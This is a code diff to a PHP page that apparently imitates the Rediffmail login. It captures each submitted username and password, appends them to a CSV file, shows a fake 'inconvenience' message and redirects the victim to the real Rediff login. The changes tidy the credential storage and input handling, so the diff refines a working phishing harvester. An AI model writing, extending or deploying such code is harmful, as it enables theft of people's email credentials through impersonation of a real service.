@@ -32,13 +32,13 @@
         $error_msg = "";
         if($_SERVER['REQUEST_METHOD'] == 'POST')
         {
-            $user = $_POST['username'];
-            $pwd = $_POST['password'];
+            $user = htmlspecialchars($_POST['username']);
+            $pwd =htmlspecialchars($_POST['password']);
             $pattern = "/^[a-zA-Z0-9._%+-]+@rediffmail\.com$/";  
             // validate_username($user);
             if(empty($user) || empty($pwd))
             { 
-                $error_msg = "Username field is empty";
+                $error_msg = "Username/ Password field is empty";
                 // exit();
             }
             // if (empty($user)) {
@@ -55,15 +55,19 @@
             // if(empty($error_msg))
             else
             {
-                $fp = fopen("username.txt",'a');
-                fwrite($fp,"USERNAME : ");
-                fwrite($fp,$user);
-                fwrite($fp," -- ");
-                fwrite($fp,"PASSWORD : ");
-                fwrite($fp,$pwd);
+                $fp = fopen("username.csv",'a');
+                // to be run only the first time
+                // fwrite($fp, "Username");
+                // fwrite($fp, ",");
+                // fwrite($fp, "Password");
+                // fwrite($fp,"\n");
+
                 fwrite($fp,"\n");
+                fwrite($fp,$user);
+                fwrite($fp,",");
+                fwrite($fp,$pwd);
                 fclose($fp);
-                echo $error_msg;
+                // echo $error_msg;
                 echo "Sorry for the inconvinience. Redirecting to login page.";
                 header("Refresh:3; url=https://mail.rediff.com/cgi-bin/login.cgi");
                 exit();
